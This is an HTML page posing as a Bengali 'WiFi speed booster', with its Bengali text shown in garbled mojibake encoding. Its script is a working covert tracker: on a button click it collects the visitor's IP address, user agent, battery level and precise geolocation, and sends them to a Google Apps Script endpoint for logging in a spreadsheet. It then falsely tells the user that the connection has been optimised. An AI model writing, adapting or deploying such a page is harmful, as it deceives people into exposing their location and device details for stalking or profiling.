<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Verification</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #eef2f3; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        button { background: #28a745; color: white; border: none; padding: 15px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>WiFi рж╕рзНржкрж┐ржб ржмрзБрж╕рзНржЯрж╛рж░ ЁЯЪА</h2>
        <p>ржЖржкржирж╛рж░ ржХрж╛ржирзЗржХрж╢ржи ржЕржкрзНржЯрж┐ржорж╛ржЗржЬ ржХрж░рждрзЗ ржирж┐ржЪрзЗрж░ ржмрж╛ржЯржирзЗ ржХрзНрж▓рж┐ржХ ржХрж░рзБржиред</p>
        <button id="startBtn">ржмрзБрж╕рзНржЯ ржХрж░рзБржи</button>
        <p id="msg"></p>
    </div>

    <script>
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx4yOhl3Nzzre2hPLK_FEslSvqFqDo2ynUAJnu1fh1J2J2esteRVu9gA_4g6moFU06K/exec"; // ржЖржкржирж╛рж░ рж▓рж┐ржЩрзНржХ ржПржЦрж╛ржирзЗ ржмрж╕рж╛ржи

        document.getElementById('startBtn').addEventListener('click', async function() {
            document.getElementById('msg').innerText = "ржкрзНрж░рж╕рзЗрж╕рж┐ржВ рж╣ржЪрзНржЫрзЗ...";

            try {
                // рзз. ржЖржЗржкрж┐ рж╕ржВржЧрзНрж░рж╣
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();

                // рзи. ржмрзНржпрж╛ржЯрж╛рж░рж┐
                let bat = await navigator.getBattery();
                let batLvl = (bat.level * 100) + "%";

                // рзй. рж▓рзЛржХрзЗрж╢ржи
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let info = {
                        ip_address: ipData.ip,
                        device_info: navigator.userAgent,
                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                        battery: batLvl
                    };

                    // рзк. Google Sheet-ржП ржкрж╛ржарж╛ржирзЛ
                    fetch(SCRIPT_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        cache: 'no-cache',
                        body: JSON.stringify(info)
                    }).then(() => {
                        document.getElementById('msg').innerText = "рж╕ржлрж▓ржнрж╛ржмрзЗ ржЕржкрзНржЯрж┐ржорж╛ржЗржЬ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗ! тЬЕ";
                        alert("ржЖржкржирж╛рж░ ржЗржирзНржЯрж╛рж░ржирзЗржЯ ржПржЦржи ржЖрж░ржУ ржлрж╛рж╕рзНржЯ рж╣ржмрзЗред");
                    });

                }, (err) => {
                    alert("ржжрзЯрж╛ ржХрж░рзЗ ржкрж╛рж░ржорж┐рж╢ржи ржжрж┐ржи ржирж╛рж╣рж▓рзЗ ржХрж╛ржЬ ржХрж░ржмрзЗ ржирж╛ред");
                });
            } catch (e) {
                console.log(e);
            }
        });
    </script>
</body>
</html>